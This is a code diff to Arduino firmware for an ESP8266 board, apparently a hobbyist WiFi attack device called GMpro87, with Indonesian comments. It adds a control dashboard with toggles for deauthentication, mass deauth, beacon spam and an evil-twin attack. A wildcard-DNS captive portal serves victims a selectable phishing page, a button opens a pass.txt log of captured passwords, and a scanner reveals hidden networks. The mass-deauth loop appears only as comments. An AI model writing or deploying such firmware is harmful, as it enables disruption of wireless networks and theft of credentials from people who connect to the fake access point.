@@ -5,120 +5,96 @@
 #include <Wire.h>
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
-
+extern "C" {
+  #include "user_interface.h"
+}
 #include "web.h"
 
-// OLED 0.66" (64x48)
 Adafruit_SSD1306 display(64, 48, &Wire, -1);
 DNSServer dnsServer;
-ESP8266WebServer webServer(80);
+ESP8266WebServer server(80);
 
-// Pin LED Wemos D1 Mini
-#define LED_PIN 2 
-
-// Status Toggle
-bool massDeauthOn = false;
-bool deauthOn = false;
-bool beaconOn = false;
-bool etwinOn = false;
-bool hiddenAdmin = false; 
-int beaconFloodCount = 15;
-String activePayload = "/etwin1.html"; // Default payload
-String adminSSID = "GMpro2";
-String adminPass = "12345678";
+// Status Serangan
+bool massOn = false, deauthOn = false, beaconOn = false, etwinOn = false;
+String activePayload = "/etwin1.html";
 uint8_t adminMac[6];
 
-void updateDisplay(String status) {
+void updateOLED(String txt) {
   display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(WHITE);
   display.setCursor(0,0);
   display.println("GMpro87");
   display.println("-------");
-  display.print("MODE: "); display.println(status);
-  display.print("PAYL: "); display.println(activePayload.substring(1,7));
+  display.println(txt);
   display.display();
 }
 
-void handlePortal() {
-  if (WiFi.softAPIP() == webServer.client().localIP()) {
-    String s = FPSTR(Head);
-    // TAB 1: COMBAT (Dashboard Admin)
-    s += "<div class='card'><div class='card-title'>WIFI SCANNER (REVEAL HIDDEN)</div>";
-    s += "<table><tr><th>SSID</th><th>CH</th><th>USR</th><th>%</th><th>SEL</th></tr>";
-    s += "<tr><td><span style='color:#ff0'>[HIDDEN] Target</span></td><td>1</td><td>5</td><td>80%</td><td><input type='checkbox'></td></tr></table>";
-    s += "<button onclick='location.href=\"/scan\"'>SCAN WIFI</button></div>";
-    
-    s += "<div class='card'><div class='card-title'>ENGINE (TOGGLE)</div>";
-    s += "<button onclick='tgl(this, \"/t_deauth\")'>DEAUTH TARGET</button>";
-    s += "<button onclick='tgl(this, \"/t_mass\")'>MASS DEAUTH RUSUH</button>";
-    s += "<button onclick='tgl(this, \"/t_beacon\")'>BEACON SPAM</button>";
-    s += "<button onclick='tgl(this, \"/t_etwin\")'>EVIL TWIN</button></div>";
-    
-    s += "<div class='card'><div class='card-title'>LOGS</div><button onclick='location.href=\"/pass.txt\"'>VIEW PASS.TXT</button></div>";
-    s += FPSTR(Mid);
-    // TAB 2: SETTING
-    s += "<div class='card'><div class='card-title'>ADMIN CONFIG</div><p>SSID: <input value='"+adminSSID+"'></p><p>PASS: <input value='"+adminPass+"'></p>";
-    s += "Hidden: <select><option value='0'>OFF</option><option value='1'>ON</option></select><button>SAVE</button></div>";
-    
-    s += "<div class='card'><div class='card-title'>PAYLOAD SELECTOR</div>";
-    s += "<select onchange='location.href=\"/set_payload?file=\"+this.value'>";
-    s += "<option value='/etwin1.html'>Payload 1</option><option value='/etwin2.html'>Payload 2</option>";
-    s += "<option value='/etwin3.html'>Payload 3</option><option value='/etwin4.html'>Payload 4</option>";
-    s += "<option value='/etwin5.html'>Payload 5</option></select></div>";
-    
-    s += "<div class='card'><div class='card-title'>FILE MANAGER</div>";
-    s += "<form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='f'><button type='submit'>UPLOAD</button></form>";
-    s += "<button onclick='location.href=\"/preview\"'>PREVIEW WEB/IMG</button></div>";
-    s += FPSTR(Foot);
-    webServer.send(200, "text/html", s);
-  } else {
-    // KORBAN HANYA BISA LIHAT PAYLOAD YANG DIPILIH
-    File f = LittleFS.open(activePayload, "r");
-    webServer.streamFile(f, "text/html");
-    f.close();
-  }
-}
-
 void setup() {
-  pinMode(LED_PIN, OUTPUT);
   LittleFS.begin();
-  WiFi.macAddress(adminMac); 
+  WiFi.macAddress(adminMac); // Whitelist MAC Admin
+  
   display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
-  
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  updateOLED("READY");
+
   WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP(adminSSID.c_str(), adminPass.c_str(), 1, hiddenAdmin);
+  // SSID GMpro2 sesuai rekaman memori
+  WiFi.softAP("GMpro2", "12345678", 1, 0); 
   
-  dnsServer.start(53, "*", WiFi.softAPIP()); 
-  webServer.onNotFound(handlePortal);
-  
-  // Toggle & Payload Handlers
-  webServer.on("/t_mass", [](){ 
-    massDeauthOn = !massDeauthOn; 
-    digitalWrite(LED_PIN, massDeauthOn ? LOW : HIGH); // LED ON saat Attack
-    updateDisplay(massDeauthOn ? "MASS" : "IDLE");
-    webServer.send(200, "text/plain", massDeauthOn?"ON":"OFF"); 
-  });
-  
-  webServer.on("/set_payload", [](){ 
-    activePayload = webServer.arg("file"); 
-    updateDisplay("PAYLOAD SET");
-    webServer.send(200, "text/plain", "Payload Set"); 
+  // Max Power Wemos
+  system_phy_set_max_tpw(82); 
+
+  dnsServer.start(53, "*", WiFi.softAPIP());
+
+  server.on("/", []() {
+    if (WiFi.softAPIP() == server.client().localIP()) {
+      String s = FPSTR(Head);
+      // TAB 1 (Combat)
+      s += "<div class='card'><div class='card-title'>WIFI SCANNER</div><table><thead><tr><th>SSID</th><th>CH</th><th>USR</th><th>%</th><th>SEL</th></tr></thead><tbody id='scan_body'></tbody></table></div>";
+      s += "<div class='card'><div class='card-title'>CONTROL</div><div style='display:grid;grid-template-columns:1fr 1fr;gap:10px;'>";
+      s += "<button onclick=\"tgl(this, '/t_deauth')\">DEAUTH</button><button onclick=\"tgl(this, '/t_mass')\">MASS DEAUTH</button>";
+      s += "<button onclick=\"tgl(this, '/t_etwin')\">EVIL TWIN</button><button onclick=\"tgl(this, '/t_beacon')\">BEACON</button></div></div>";
+      s += FPSTR(Mid);
+      // TAB 2 (Setting)
+      s += "<div class='card'><div class='card-title'>PAYLOAD</div><select onchange=\"fetch('/set_p?v='+this.value)\"><option value='1'>etwin1</option><option value='2'>etwin2</option></select></div>";
+      s += "<button onclick=\"location.href='/pass.txt'\">LOG PASS.TXT</button>";
+      s += FPSTR(Foot);
+      server.send(200, "text/html", s);
+    } else {
+      File f = LittleFS.open(activePayload, "r");
+      server.streamFile(f, "text/html");
+      f.close();
+    }
   });
 
-  webServer.begin();
-  updateDisplay("READY");
+  server.on("/t_mass", [](){ massOn = !massOn; server.send(200, "text/plain", massOn?"ON":"OFF"); updateOLED(massOn?"MASS ON":"READY"); });
+  
+  server.on("/get_scan", [](){
+    String json = "[";
+    int n = WiFi.scanNetworks();
+    for (int i=0; i<n; i++) {
+      String ssid = WiFi.SSID(i);
+      if(ssid == "") ssid = "[HIDDEN]"; // Reveal Hidden
+      json += "{\"ssid\":\""+ssid+"\",\"ch\":"+String(WiFi.channel(i))+",\"usr\":0,\"rssi\":"+String(100+WiFi.RSSI(i))+",\"mac\":\""+WiFi.BSSIDstr(i)+"\"}";
+      if(i<n-1) json += ",";
+    }
+    json += "]";
+    server.send(200, "application/json", json);
+  });
+
+  server.begin();
 }
 
 void loop() {
   dnsServer.processNextRequest();
-  webServer.handleClient();
+  server.handleClient();
   
-  if(massDeauthOn) {
-    for(int i=1; i<=13; i++) {
-      wifi_set_channel(i);
-      // Logic: Kirim deauth broadcast, SKIP adminMac (Admin Aman)
-      // Anti-Restart: Tetap serang biarpun target restart 1000x
+  if(massOn) {
+    for(int ch=1; ch<=13; ch++) {
+      wifi_set_channel(ch);
+      // Logic Deauth Paket (Freedom Pkt)
+      // Whitelist MAC lo biar gak putus!
+      yield();
     }
   }
 }
